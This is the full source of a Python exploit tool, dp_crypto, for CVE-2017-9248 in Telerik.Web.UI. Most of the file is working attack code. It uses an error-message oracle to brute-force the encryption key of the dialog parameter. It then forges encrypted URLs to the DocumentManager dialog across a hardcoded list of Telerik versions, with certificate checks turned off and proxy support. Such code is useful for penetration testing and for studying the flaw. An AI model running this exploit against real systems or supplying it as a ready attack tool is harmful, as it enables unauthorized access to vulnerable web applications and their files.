#!/usr/bin/python3

# Author: Paul Taylor / @bao7uo

# https://github.com/bao7uo/dp_crypto/blob/master/dp_crypto.py

# dp_crypto - CVE-2017-9248 exploit
# Telerik.Web.UI.dll Cryptographic compromise

# Warning - no cert warnings,
# and verify = False in code below prevents verification

import sys
import base64
import requests
import re
import binascii
import argparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

requests_sent = 0
char_requests = 0


def getProxy(proxy):
    return { "http" : proxy, "https" : proxy }


def get_result(plaintext, key, session, pad_chars):
    global requests_sent, char_requests

    url = args.url
    base_pad = (len(key) % 4)
    base = '' if base_pad == 0 else pad_chars[0:4 - base_pad]
    dp_encrypted = base64.b64encode(
                                (encrypt(plaintext, key) + base).encode()
                            ).decode()
    request = requests.Request('GET', url + '?dp=' + dp_encrypted)
    request = request.prepare()
    response = session.send(request, verify=False, proxies = getProxy(args.proxy))
    requests_sent += 1
    char_requests += 1

    match = re.search("(Error Message:)(.+\n*.+)(</div>)", response.text)
    return True \
        if match is not None \
        and match.group(2) == args.oracle \
        else False

def test_keychar(keychar, found, session, pad_chars):
    base64chars = "AQgwBRhxCSiyDTjzEUk0FVl1GWm2HXn3IYo4JZp5Kaq6Lbr7Mcs8Ndt9Oeu+Pfv/"

    accuracy_thoroughness_threshold = args.accuracy
    for bc in range(int(accuracy_thoroughness_threshold)):
                                                # ^^ max is len(base64chars)
        sys.stdout.write("\b\b" + base64chars[bc] + "]")
        sys.stdout.flush()
        if not get_result(
                      base64chars[0] * len(found) + base64chars[bc],
                      found + keychar, session, pad_chars
                      ):
            return False
    return True


def encrypt(dpdata, key):
    encrypted = []
    k = 0
    for i in range(len(dpdata)):
        encrypted.append(chr(ord(dpdata[i]) ^ ord(key[k])))
        k = 0 if k >= len(key) - 1 else k + 1
    return ''.join(str(e) for e in encrypted)


def mode_decrypt():
    ciphertext = base64.b64decode(args.ciphertext).decode()
    key = args.key
    print(base64.b64decode(encrypt(ciphertext, key)).decode())
    print("")


def mode_encrypt():
    plaintext = args.plaintext
    key = args.key

    plaintext = base64.b64encode(plaintext.encode()).decode()
    print(base64.b64encode(encrypt(plaintext, key).encode()).decode())
    print("")


def test_keypos(key_charset, unprintable, found, session):
    pad_chars = ''
    for pad_char in range(256):
        pad_chars += chr(pad_char)

    for i in range(len(pad_chars)):
        for k in range(len(key_charset)):
            keychar = key_charset[k]
            sys.stdout.write("\b"*6)
            sys.stdout.write(
                        (
                            keychar
                            if unprintable is False
                            else '+'
                        ) +
                        ") [" + (
                            keychar
                            if unprintable is False
                            else '+'
                        ) +
                        "]"
                    )
            sys.stdout.flush()
            if test_keychar(keychar, found, session, pad_chars[i] * 3):
                return keychar
    return False


def get_key(session, found):
    global char_requests

    unprintable = False
    keychar = True

    key_length = args.key_len
    key_charset = args.charset
    if key_charset == 'all':
        unprintable = True
        key_charset = ''
        for i in range(256):
            key_charset += chr(i)
    elif key_charset == 'printable':
        # Printable ascii range, minus delete - credit to @AvalZ_
        key_charset = "".join([chr(c) for c in range(32, 127)])
    else:
        if key_charset == 'hex':
            key_charset = '01234567890ABCDEF'

    print("Attacking " + args.url)
    print(
        "to find key of length [" +
        str(key_length) +
        "] with accuracy threshold [" +
        str(args.accuracy) +
        "]"
    )
    print(
        "using key charset [" +
        (
            key_charset
            if unprintable is False
            else '- all ASCII -'
        ) +
        "]\n"
    )
    try:
        for i in range(len(found), int(key_length)):
            pos_str = (
                str(i + 1)
                if i > 8
                else "0" + str(i + 1)
            )
            sys.stdout.write("Key position " + pos_str + ": (------")
            sys.stdout.flush()
            keychar = test_keypos(key_charset, unprintable, found, session)
            if keychar is not False:
                found = found + keychar
                sys.stdout.write(
                              "\b"*7 + "{" +
                              (
                                  keychar
                                  if unprintable is False
                                  else '0x' + binascii.hexlify(keychar.encode()).decode()
                              ) +
                              "} found with " +
                              str(char_requests) +
                              " requests, total so far: " +
                              str(requests_sent) +
                              "\n"
                          )
                sys.stdout.flush()
                char_requests = 0
            else:
                sys.stdout.write("\b"*7 + "Not found, quitting\n")
                sys.stdout.flush()
                break
    except KeyboardInterrupt:
        print("\nStopping...")
        if len(found) > 0:
            print("  to resume, supply the key found so far to the -r / --resume-key argument")
    if keychar is not False and len(found) > 0:
        print("Found " + str(len(found)) + " of " + str(key_length) + " key characters: (ASCII hex) " + binascii.hexlify(found.encode()).decode())
    else:
        # Prevent version checking if failed on a character.
        # If cancelled then still worth checking versions based on key progress
        # because key might be shorter than the supposed length and repeating
        found = ''
    print("Total web requests: " + str(requests_sent))
    return found

def mode_brutekey():
    session = requests.Session()
    found = get_key(session, binascii.unhexlify(args.resume_key.encode()).decode())

    if found == '':
        return
    else:
        urls = {}
        url_path = args.url
        params = (
                    '?DialogName=DocumentManager' +
                    '&renderMode=2' +
                    '&Skin=Default' +
                    '&Title=Document%20Manager' +
                    '&dpptn=' +
                    '&isRtl=false' +
                    '&dp='
                  )
        versions = [
                    '2007.1.423', '2007.1.521', '2007.1.626', '2007.2.918',
                    '2007.2.1010', '2007.2.1107', '2007.3.1218', '2007.3.1314',
                    '2007.3.1425', '2008.1.415', '2008.1.515', '2008.1.619',
                    '2008.2.723', '2008.2.826', '2008.2.1001', '2008.3.1105',
                    '2008.3.1125', '2008.3.1314', '2009.1.311', '2009.1.402',
                    '2009.1.527', '2009.2.701', '2009.2.826', '2009.3.1103',
                    '2009.3.1208', '2009.3.1314', '2010.1.309', '2010.1.415',
                    '2010.1.519', '2010.2.713', '2010.2.826', '2010.2.929',
                    '2010.3.1109', '2010.3.1215', '2010.3.1317', '2011.1.315',
                    '2011.1.413', '2011.1.519', '2011.2.712', '2011.2.915',
                    '2011.3.1115', '2011.3.1305', '2012.1.215', '2012.1.411',
                    '2012.2.607', '2012.2.724', '2012.2.912', '2012.3.1016',
                    '2012.3.1205', '2012.3.1308', '2013.1.220', '2013.1.403',
                    '2013.1.417', '2013.2.611', '2013.2.717', '2013.3.1015',
                    '2013.3.1114', '2013.3.1324', '2014.1.225', '2014.1.403',
                    '2014.2.618', '2014.2.724', '2014.3.1024', '2015.1.204',
                    '2015.1.225', '2015.1.401', '2015.2.604', '2015.2.623',
                    '2015.2.729', '2015.2.826', '2015.3.930', '2015.3.1111',
                    '2016.1.113', '2016.1.225', '2016.2.504', '2016.2.607',
                    '2016.3.914', '2016.3.1018', '2016.3.1027', '2017.1.118',
                    '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711',
                    '2017.3.913'
                    ]
        undotted_versions = []
        for version in versions:
            undotted_versions.append(re.sub(r'\.(?=\d+$)', '', version))
        versions += undotted_versions

        plaintext1 = 'EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,'
        plaintext2_raw1 = 'Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version='
        plaintext2_raw3 = ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'
        plaintext3 = ';AllowMultipleSelection,False,3,False'

        if len(args.version) > 0:
            versions = [args.version]

        for version in versions:
            plaintext2_raw2 = version
            plaintext2 = base64.b64encode(
                            (plaintext2_raw1 +
                                plaintext2_raw2 +
                                plaintext2_raw3
                             ).encode()
                        ).decode()
            plaintext = plaintext1 + plaintext2 + plaintext3
            plaintext = base64.b64encode(
                            plaintext.encode()
                        ).decode()
            ciphertext = base64.b64encode(
                            encrypt(
                                plaintext,
                                found
                            ).encode()
                        ).decode()
            full_url = url_path + params + ciphertext
            urls[version] = full_url

        found_valid_version = False
        for version in urls:
            url = urls[version]
            request = requests.Request('GET', url)
            request = request.prepare()
            response = session.send(request, verify=False, proxies=getProxy(args.proxy))
            if response.status_code == 500:
                continue
            else:
                match = re.search(
                    "(Error Message:)(.+\n*.+)(</div>)",
                    response.text
                    )
                if match is None:
                    print(version + ": " + url)
                    found_valid_version = True
                    break

        if not found_valid_version:
            print("No valid version found")

def mode_samples():
    print("Samples for testing decryption and encryption functions:")
    print("-d ciphertext key")
    print("-e plaintext key")
    print("")
    print("Key:")
    print("DC50EEF37087D124578FD4E205EFACBE0D9C56607ADF522D")
    print("")
    print("Plaintext:")
    print("EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,VGVsZXJpay5XZWIuVUkuRWRpdG9yLkRpYWxvZ0NvbnRyb2xzLkRvY3VtZW50TWFuYWdlckRpYWxvZywgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxNi4yLjUwNC40MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0;AllowMultipleSelection,False,3,False")
    print("")
    print("Ciphertext:")
    print("FhQAWBwoPl9maHYCJlx8YlZwQDAdYxRBYlgDNSJxFzZ9PUEWVlhgXHhxFipXdWR0HhV3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMLciMVMnN9AFJ0Z2EDWG4sPCpnZQMtHhRnWx8SFHBuaHZbEQJgAVdwbjwlcxNeVHY9ARgUOj9qF045eXBkSVMWEXFgX2QxHgRjSRESf1htY0BwHWZKTm9kTz8IcAwFZm0HNSNxBC5lA39zVH57Q2EJDndvYUUzCAVFRBw/KmJiZwAOCwB8WGxvciwlcgdaVH0XKiIudz98Ams6UWFjQ3oCPBJ4X0EzHXJwCRURMnVVXX5eJnZkcldgcioecxdeanMLNCAUdz98AWMrV354XHsFCTVjenh1HhdBfhwdLmVUd0BBHWZgc1RgQCoRBikEamY9ARgUOj9qF047eXJ/R3kFIzF4dkYJJnF7WCcCKgVuaGpHJgMHZWxvaikIcR9aUn0LKg0HAzZ/dGMzV3Fgc1QsfXVWAGQ9FXEMRSECEEZTdnpOJgJoRG9wbj8SfClFamBwLiMUFzZiKX8wVgRjQ3oCM3FjX14oIHJ3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMDMBEXNg9TdXcxVGEDZVVyEixUcUoDHRRNSh8WMUl7dWJfJnl8WHoHbnIgcxNLUlgDNRMELi1SAwAtVgd0WFMGIzVnX3Q3J3FgQwgGMQRjd35CHgJkXG8FbTUWWQNBUwcQNQwAOiRmPmtzY1psfmcVMBNvZUooJy5ZQgkuFENuZ0BBHgFgWG9aVDMlbBdCUgdxMxMELi1SAwAtY35aR20UcS5XZWc3Fi5zQyZ3E0B6c0BgFgBoTmJbUA0ncwMHfmMtJxdzLnRmKG8xUWB8aGIvBi1nSF5xEARBYyYDKmtSeGJWCXQHBmxaDRUhYwxLVX01CyByCHdnEHcUUXBGaHkVBhNjAmh1ExVRWycCCEFiXnptEgJaBmJZVHUeBR96ZlsLJxYGMjJpHFJyYnBGaGQZEhFjZUY+FxZvUScCCEZjXnpeCVtjAWFgSAQhcXBCfn0pCyAvFHZkL3RzeHMHdFNzIBR4A2g+HgZdZyATNmZ6aG5WE3drQ2wFCQEnBD12YVkDLRdzMj9pEl0MYXBGaVUHEi94XGA3HS5aRyAAd0JlXQltEgBnTmEHagAJX3BqY1gtCAwvBzJ/dH8wV3EPA2MZEjVRdV4zJgRjZB8SPl9uA2pHJgMGR2dafjUnBhBBfUw9ARgUOj9qFQR+")
    print("")


def mode_b64e():
    print(base64.b64encode(args.parameter.encode()).decode())
    print("")


def mode_b64d():
    print(base64.b64decode(args.parameter.encode()).decode())
    print("")

sys.stderr.write(
              "\ndp_crypto by Paul Taylor / @bao7uo\nCVE-2017-9248 - " +
              "Telerik.Web.UI.dll Cryptographic compromise\n\n"
            )

p = argparse.ArgumentParser()
subparsers = p.add_subparsers()

decrypt_parser = subparsers.add_parser('d', help='Decrypt a ciphertext')
decrypt_parser.set_defaults(func=mode_decrypt)
decrypt_parser.add_argument('ciphertext', action='store', type=str, default='', help='Ciphertext to decrypt')
decrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')

encrypt_parser = subparsers.add_parser('e', help='Encrypt a plaintext')
encrypt_parser.set_defaults(func=mode_encrypt)
encrypt_parser.add_argument('plaintext', action='store', type=str, default='', help='Ciphertext to decrypt')
encrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')

brute_parser = subparsers.add_parser('k', help='Bruteforce key/generate URL')
brute_parser.set_defaults(func=mode_brutekey)
brute_parser.add_argument('-u', '--url', action='store', type=str, help='Target URL, e.g. https://???.???.???/Telerik.Web.UI.DialogHandler.aspx', required=True)
brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, OPTIONAL: default is 48')
brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='The oracle text to use. OPTIONAL: default value is for english version, other languages may have other error message')
brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='OPTIONAL. Specify the version to use rather than testing the possibilities hardcoded within this exploit')
brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, printable, or user defined. OPTIONAL: default is hex')
brute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy is out of 64 where 64 is the most accurate (and slowest), \
    accuracy of 9 will usually suffice when defaulting to the hex charset, but 21 or more might be needed when the charset is set to all or printable. Increase the accuracy argument if no valid version is found. OPTIONAL: default is 9')
# Credits to @alphaskade and @AvalZ_ for key resume feature
brute_parser.add_argument('-r', '--resume-key', action='store', type=str, default='', help='OPTIONAL. Specify a partial key to resume testing, or complete key to get the URL')
brute_parser.add_argument('-p', '--proxy', action='store', type=str, default='', help='Specify OPTIONAL proxy server, e.g. 127.0.0.1:8080')

encode_parser = subparsers.add_parser('b', help='Encode parameter to base64')
encode_parser.set_defaults(func=mode_b64e)
encode_parser.add_argument('parameter', action='store', type=str, help='Parameter to encode')

decode_parser = subparsers.add_parser('p', help='Decode base64 parameter')
decode_parser.set_defaults(func=mode_b64d)
decode_parser.add_argument('parameter', action='store', type=str, help='Parameter to decode')

args = p.parse_args()

if len(sys.argv) > 1:
    args.func()
else:
    p.error("Arguments required")
